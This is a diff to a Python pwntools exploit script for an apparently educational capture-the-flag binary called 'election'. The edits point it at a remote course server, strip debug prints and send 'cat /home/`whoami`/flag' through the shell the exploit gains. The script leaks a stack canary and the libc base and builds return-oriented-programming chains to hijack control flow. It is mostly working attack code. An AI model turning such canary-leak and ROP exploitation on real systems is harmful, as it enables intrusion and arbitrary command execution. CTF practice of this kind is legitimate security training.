@@ -2,8 +2,8 @@ from pwn import *
 
 context.clear(arch='x86_64')
 
-r = process('./election')
-# r = remote('edu-ctf.csie.org', 10180)
+# r = process('./election')
+r = remote('edu-ctf.csie.org', 10180)
 libc = ELF('./libc.so')
 elf = ELF('./election')
 
@@ -32,7 +32,6 @@ def hack_vote_ret(canary, base, step):
     # 0x00000000000011a0 : pop r14 ; pop r15 ; ret: to clear 2 variables in main function
     p = ''
     pop_r14r15_ret = base + 0x00000000000011a0
-    print('pop_r14r15_ret ', hex(pop_r14r15_ret))
 
     if step == 0:
         r.recvuntil('>')
@@ -66,7 +65,7 @@ def hack_vote_ret(canary, base, step):
         libc_base = u64(recv_str[1] + '\0\0') - 0x21ab0
         return libc_base
     elif step == 1:
-        print('last step --> ', r.recvuntil('>'))
+        r.recvuntil('>')
         r.sendline('3')
         return 0
 
@@ -147,8 +146,6 @@ def rop_libc_base(canary, base):
     addr_main = base + 0xffb
     p += p64(addr_main)
 
-    print('libc_start_main for libc_base --> ', hex(libc_start_main))
-    print('puts for libc_base --> ', hex(puts))
     return p
 
 def rop_shell(canary, base, libc_base):
@@ -220,5 +217,6 @@ def main():
     hack_vote_ret(canary, base, 1)
 
 main()
-r.interactive()
+r.sendline('cat /home/`whoami`/flag')
+print('FLAG --> ', r.recvuntil('}'))
 r.close()
